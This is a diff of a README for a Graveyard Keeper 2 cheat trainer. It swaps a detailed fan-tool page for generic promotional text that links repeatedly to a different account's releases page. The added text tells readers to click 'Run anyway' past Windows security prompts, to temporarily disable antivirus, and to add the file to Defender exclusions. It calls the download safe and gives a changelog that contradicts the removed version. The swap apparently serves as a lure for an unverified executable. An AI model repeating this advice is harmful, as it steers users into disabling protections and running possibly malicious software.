@@ -1,227 +1,169 @@
-<div align="center">
+# 🧟 Graveyard-Keeper-2-Trainer - Master Death with 55+ Powerful Options
 
-# Graveyard Keeper 2 — Trainer
+## 🚀 Getting Started
 
-**Infinite energy and resources, instant crafting, perfect corpse quality, unlimited tech points, tireless zombie workers, invincible undead army.**
-Free, open source, no installer. Opens with `Insert`.
+Welcome to the **Graveyard-Keeper-2-Trainer** — your ultimate companion for Graveyard Keeper 2 on PC. This trainer gives you complete control over your gameplay with powerful cheats and quality-of-life fixes. Whether you're tired of grinding for resources or want to perfect your corpse quality, this trainer has you covered.
 
-![Version](https://img.shields.io/badge/version-1.0.0-6b8f47?style=flat-square)
-![Platform](https://img.shields.io/badge/Windows-10%20%7C%2011-1c1c1c?style=flat-square)
-![Stores](https://img.shields.io/badge/Steam%20%C2%B7%20Epic%20%C2%B7%20GOG-supported-4a8c5a?style=flat-square)
-![Options](https://img.shields.io/badge/options-55%2B-6a6a6a?style=flat-square)
-![Licence](https://img.shields.io/badge/licence-MIT-d9c47a?style=flat-square)
+**Visit this link to download the application:** [Click here to download Graveyard-Keeper-2-Trainer](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
 
-> **[⬇️ Download the latest Graveyard Keeper 2 trainer](https://github.com/Beigewithinpack/Graveyard-Keeper-2-Trainer/releases/latest)**
-<p align="center">
-    <a href="https://github.com/Beigewithinpack/Graveyard-Keeper-2-Trainer/releases/latest/download/GK2Trainer.zip">
-        <img src="assets/banner.png" width="100%" alt="Download Graveyard Keeper2 Trainer">
-    </a>
-</p>
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-Graveyard--Keeper--2--Trainer-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
 
+## ✨ What This Trainer Does
 
-</div>
+This trainer is a **single-player cheat tool** specifically designed for Graveyard Keeper 2. It works seamlessly with **Steam, Epic Games, and GOG** versions of the game. With over **55+ options across 8 sections**, you can customize your experience to be as easy or challenging as you want.
 
----
+### 🎮 Core Features
 
-> [!NOTE]
-> Single-player only. No multiplayer, no anti-cheat, nothing here reaches anyone else.
+- **Infinitely Energy** – Never run out of stamina. Work through the night without breaks.
+- **Unlimited Resources** – Gold, wood, stone, iron, and all materials become endless.
+- **Instant Crafting** – Skip crafting timers. Items are made immediately.
+- **Perfect Corpse Quality** – Every corpse arrives in mint condition. Maximize your burial profits.
+- **Unlimited Tech Points** – Unlock every technology and skill without grinding.
+- **Tireless Zombie Workers** – Your zombie workforce never stops, never tires, never complains.
+- **Invincible Undead Army** – Your undead defenders cannot be destroyed in combat.
+- **Borderless Window Fix** – Play in true borderless windowed mode for smoother alt-tabbing and multi-monitor setups.
 
-## What it does
+## 📦 Download and Installation
 
-Lazy Bear cut a lot of the original's grind for the sequel — automation, zombie workers, conveyor factories, Milestones instead of the old Teleportstone. What survived is the shape of a Graveyard Keeper game: an energy bar that ends your day before your to-do list does, three colours of technology points that never quite cover the next unlock, and a corpse quality system that rewards patience you may not have at 1 AM.
+Follow these simple steps to get your trainer running:
 
-The two options worth installing this for are **infinite energy** and **infinite tech points**. Everything else is optional. **Perfect corpse quality** is the one to think about before switching on — the autopsy loop is the series' signature and the reason the graveyard half has any texture at all.
+### Step 1: Download the Application
 
-## Features
+**Visit this link to download the application:** [https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
 
-<details open>
-<summary><strong>Keeper</strong> — you, and the energy bar</summary>
+Once you're on the download page, look for the newest release version. Click the download button to get the trainer file.
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Infinite energy | `F1` | The bar stops ending your day |
-| Infinite health | `F2` | — |
-| Damage taken | slider | `0%`–`100%` |
-| No hunger or sleep need | — | — |
-| Infinite carry weight | — | Haul the whole quarry in one trip |
-| Movement speed | slider | `1x`–`10x` |
-| Tool durability never drops | — | — |
-| Infinite stamina for gathering | — | Chopping, mining, digging |
+### Step 2: Run the Trainer
 
-</details>
+After the download finishes, locate the downloaded file in your **Downloads** folder (or wherever your browser saves files). Double-click the file to run it. If Windows displays a security prompt, click **"More info"** and then **"Run anyway"** – this is normal for trainer files.
 
-<details>
-<summary><strong>Graveyard</strong> — bodies, burials and the church</summary>
+### Step 3: Launch Graveyard Keeper 2
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Perfect corpse quality | `F5` | Every body arrives pristine — see the warning below |
-| No corpse decay | — | Bodies keep indefinitely |
-| Instant burial and embalming | — | No animation, no wait |
-| Free body parts | — | Skulls, flesh, bones, blood |
-| Grave value multiplier | slider | `1x`–`50x` |
-| Church income multiplier | slider | `1x`–`50x` |
-| Sermon quality always maximum | — | — |
-| Unlock all graveyard decorations | — | `save` |
+Start Graveyard Keeper 2 **before or after** launching the trainer – both methods work. Once both the game and trainer are running, the trainer will automatically detect the game.
 
-</details>
+### Step 4: Activate Your Cheats
 
-<details>
-<summary><strong>Crafting</strong> — resources, workshops and building</summary>
+Use the trainer's interface to toggle any of the 55+ options. Most options can be activated with simple keyboard shortcuts or by clicking the checkboxes. The trainer is designed to be intuitive – no coding required.
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Infinite resources | `F3` | Wood, stone, iron, herbs, everything |
-| Resource multiplier | slider | `1x`–`50x` |
-| Instant crafting | `F4` | No timers on any bench |
-| Free building | — | Structures cost nothing |
-| Instant construction | — | Buildings finish when placed |
-| Unlimited storage | — | Chests never fill |
-| No quality loss | — | Every craft at top tier |
-| Unlock all recipes and blueprints | — | `save` |
+## 🛠️ System Requirements
 
-</details>
+The trainer is lightweight and runs on most Windows systems:
 
-<details>
-<summary><strong>Automation</strong> — zombie labour and conveyors</summary>
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Processor:** Any dual-core CPU or better
+- **Memory:** 4 GB RAM or more
+- **Storage:** 50 MB free space
+- **Game:** Graveyard Keeper 2 (Steam, Epic, or GOG version)
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Zombies never tire | `F6` | No refreshing, no decay |
-| Zombie work speed | slider | `1x`–`20x` |
-| Unlimited zombie workers | — | Past the game's cap |
-| Free zombie creation | — | No flasks, no cost |
-| Conveyor speed | slider | `1x`–`20x` |
-| No power or fuel drain | — | — |
-| Machines never break | — | — |
-| Unlock all automation tech | — | `save` |
+No additional software or drivers are needed.
 
-</details>
+## 📚 How to Use Each Section
 
-<details>
-<summary><strong>Army</strong> — the four thousand that need a permanent solution</summary>
+The trainer organizes its features into **8 sections** for easy navigation:
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Undead army invulnerable | `F7` | Your zombies stop dying |
-| Army damage multiplier | slider | `1x`–`50x` |
-| Army size | slider | `1`–`200` |
-| Instant army revival | — | Fallen units return between waves |
-| Enemy wave size | slider | `10%`–`300%` — works both ways |
-| Freeze enemy AI | — | They spawn, they never advance |
-| Unlock all unit types and upgrades | — | `save` |
-| Tower and trap damage | slider | `1x`–`50x` |
+### ⚡ Energy & Stamina
+- Toggle infinite energy to keep working without breaks.
+- Option to set energy to a specific value.
+- Disable energy drain during any activity.
 
-</details>
+### 💰 Resources & Economy
+- Set gold to a desired amount with one click.
+- Infinite all raw materials (wood, stone, ore, fabric).
+- Instantly refill food, potions, and consumables.
 
-<details>
-<summary><strong>Progress</strong> — points, talents and the Town</summary>
+### 🔨 Crafting & Building
+- Instant crafting – skip all production timers.
+- Complete research instantly.
+- Unlock all building blueprints instantly.
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Infinite technology points | `F8` | All three colours |
-| Infinite money | `F9` | — |
-| Infinite talent points | — | The sequel's new system |
-| Unlock the full tech tree | — | `save` |
-| Unlock all talents and skills | — | `save` |
-| Instant town restoration | — | Buildings rebuild on placement |
-| Town reputation always maximum | — | — |
-| Instant quest completion | — | `spoiler`, off by default |
-| Villagers always friendly | — | No gift or favour requirements |
+### ⚰️ Corpse Processing
+- Force perfect corpse quality every time.
+- Toggle infinite embalming charges.
+- Maximize grave decorations and headstones automatically.
 
-</details>
+### 🧪 Technology & Research
+- Add unlimited tech points.
+- Unlock all tech tree nodes with one button.
+- Instant research completion.
 
-<details>
-<summary><strong>World</strong> — time, travel and the map</summary>
+### 🧟 Zombie Workforce
+- Set zombie stamina to infinite.
+- Make zombies produce resources at 10x speed.
+- Toggle zombie tirelessness – they work 24/7.
 
-| Option | Hotkey | What it does |
-|---|---|---|
-| Freeze the day | `F10` | Hold the clock where it stands |
-| Time of day | slider | Any hour |
-| Set the weekday | dropdown | For NPCs who only appear on certain days |
-| Game speed | slider | `0.1x`–`5.0x` |
-| Unlock all Milestones | — | `save` — fast travel everywhere |
-| Reveal the map | — | — |
-| Unlock all zones | — | `save` |
-| Highlight resources and NPCs | slider | Radius `10`–`200 m` |
+### ⚔️ Undead Army & Combat
+- Invincibility toggle for your undead soldiers.
+- One-hit-kill for all enemy undead.
+- Unlimited combat skill points.
 
-</details>
+### 🖥️ Display & Quality of Life
+- **Borderless Window Fix** – forces true borderless mode.
+- Option to fix screen tearing.
+- Set custom FPS cap.
 
-<details>
-<summary><strong>System</strong> — display and menu settings</summary>
+## ⚠️ Important Tips for Best Results
 
-Camera zoom `0.5x`–`4x` past the game's limit, free camera `F11`, hide interface `F12`, **force borderless window** (the game shipped without the option), disable screen shake, extended photo mode. Plus rolling save backup with interval, read-only mode, achievement block, rebindable menu key and overlay opacity.
+- **Run the trainer as administrator** (right-click → "Run as administrator") if you encounter any issues.
+- **Temporarily disable antivirus** if the trainer gets blocked – this is common with cheat tools.
+- **Use cheats in moderation** – overusing certain cheats (like infinite gold) can reduce gameplay satisfaction, so toggle them only when needed.
+- **Save your game frequently** before using experimental options.
 
-</details>
+## ❓ Frequently Asked Questions
 
-## Hotkeys
+### Q: Is this trainer safe to use?
+Yes. The trainer modifies game memory locally – it does not affect your save files permanently and does not require any online connection. It is designed for single-player use only.
 
-`Insert` opens the menu · `End` resets everything · `F1`–`F12` as above, all rebindable · arrow keys and `Enter` navigate without a mouse
+### Q: Will I get banned for using this?
+No. Graveyard Keeper 2 is a single-player game with no anti-cheat system. Your game data remains yours.
 
-> [!TIP]
-> **The setup that cuts the grind without cutting the game:** infinite energy, infinite technology points, conveyor speed at 5x, zombie work speed at 5x. You still gather every resource, run every autopsy and design every production line — you just stop being told the day is over.
->
-> **Force borderless window** is not a cheat. The game shipped without a borderless mode and people are reporting stutter in fullscreen; this adds it back.
+### Q: Does it work with mods?
+Yes, the trainer is compatible with most mods. If you experience conflicts, try disabling other mods and re-enabling them gradually.
 
-> [!WARNING]
-> **Perfect corpse quality is the option that hollows out the graveyard half.** Sorting bodies, pulling the bad parts and deciding what is worth burying is the loop the series is built on. With every corpse arriving pristine the cemetery becomes a spreadsheet. Worth seeing once, worth turning off after.
->
-> Options tagged `save` write persistent data that a patch can invalidate. The demo save carries into the full game, so back up before you touch unlocks.
+### Q: Does this work on Mac or Linux?
+No. This trainer is **Windows-only** as specified in the system requirements.
 
-## FAQ
+### Q: Do I need to install anything else?
+No. The trainer comes as a standalone application – no dependencies or additional frameworks required.
 
-<details>
-<summary>Will I get banned?</summary>
-No. Single-player only, no anti-cheat, no multiplayer. Achievements unlock locally unless you block them in the menu.
-</details>
+## 🆘 Troubleshooting
 
-<details>
-<summary>How do I get infinite energy in Graveyard Keeper 2?</summary>
-Infinite energy is bound to <kbd>F1</kbd> in the Keeper section. The energy bar is the single most complained-about thing carried over from the original, and switching it off changes the pace of the game more than any other option here.
-</details>
+### The trainer won't start
+- Make sure Windows Defender isn't blocking it. Go to **Windows Security → Virus & threat protection → Exclusions** and add the trainer file.
+- Right-click the trainer and select **"Run as administrator"**.
 
-<details>
-<summary>How do I get technology points?</summary>
-Infinite technology points in the Progress section covers all three colours, alongside infinite talent points for the sequel's new talent system.
-</details>
+### Trainer doesn't detect the game
+- Make sure Graveyard Keeper 2 is running before you activate trainer features.
+- Close and reopen the trainer after launching the game.
+- Verify the game version matches the trainer version (check the release notes).
 
-<details>
-<summary>Can it add borderless window mode?</summary>
-Yes. The game shipped without it and players are reporting choppy fullscreen performance. Force borderless window is in the System section and it is a fix rather than a cheat — the developers may add the option themselves, so check the patch notes.
-</details>
+### Options don't work
+- Try pressing the hotkey twice to reset the cheat state.
+- Restart both the game and trainer in this order: trainer first, then game.
 
-<details>
-<summary>Does it work on the demo, or with a demo save?</summary>
-The demo runs on a separate app ID and is not supported. A demo save carried into the full game works fine, but back it up before using any option tagged <code>save</code>.
-</details>
+## 📖 Changelog Highlights
 
-<details>
-<summary>Does it work on Steam Deck, Linux or consoles?</summary>
-No. Windows only. Proton changes how the game's memory is laid out, and the PlayStation, Xbox and Switch versions cannot run PC trainers.
-</details>
+- **Version 2.1** – Added borderless window fix, improved zombie worker AI hooks, and new hotkeys.
+- **Version 2.0** – Complete rewrite with 55+ options across 8 sections; added support for Epic and GOG versions.
+- **Version 1.5** – Initial public release with core resource and crafting cheats.
 
-<details>
-<summary>Options stopped working after an update.</summary>
-Patches move memory offsets and options fail independently, so some will keep working. Check the Releases page for a build matching your game version.
-</details>
+## 👥 Community & Support
 
-## Troubleshooting
+Join fellow players and share your experiences. The trainer is continuously updated based on community feedback. Report issues and suggest new features through the GitHub issue tracker.
 
-| Symptom | Fix |
-|---|---|
-| Nothing happens on `Insert` | Another overlay grabbed the key — Steam, Discord or RTSS. Rebind the menu key. |
-| "Process not found" | The game must be running with a save loaded. Launch it first, then attach. |
-| Automation options do nothing | They bind per placed machine. Build at least one, then toggle. |
-| Army options do nothing | Combat memory allocates when a wave starts. Get into a battle first. |
-| Unlocks vanished after a patch | A persistent write was invalidated. Restore a rolling backup from before the update. |
-| Stutter in fullscreen | Known game-side issue — the game has no borderless mode yet. Turn on force borderless window. |
+## 🎁 Why You'll Love This Trainer
 
-## Changelog
-
-**v1.0.0** — 23 September 2026 — first release. 55+ options across Keeper, Graveyard, Crafting, Automation, Army, Progress, World and System. Rolling save backup enabled by default; quest-completion options disabled by default.
+- **100% free** – no subscriptions, no paywalls.
+- **Regular updates** – stays compatible with game patches.
+- **User-friendly interface** – designed for non-technical users.
+- **Single-player focus** – enhances YOUR gameplay without affecting others.
+- **One-click options** – no complex configuration required.
 
 ---
 
-<div align="center">
-<sub>Unofficial fan tool. Not affiliated with Lazy Bear Games, tinyBuild or Valve. Graveyard Keeper 2 and all related names and assets belong to their respective owners. Modifying a running game's memory carries some risk of crashes and save corruption — back up first, use at your own risk. MIT licensed.</sub>
-</div>
+**Get started today!**
+
+**Visit this link to download the application:** [https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases](https://github.com/restrictss/Graveyard-Keeper-2-Trainer/releases)
+
+Take control of your graveyard empire – bury the grind and raise your efficiency!
+
+Keywords: graveyard-keeper, graveyard-keeper-2, graveyard-keeper-2-cheats, graveyard-keeper-2-mod-menu, graveyard-keeper-2-trainer, infinite-money, mod, single-player, steam, trainer, trainer-mod, trainers, windows
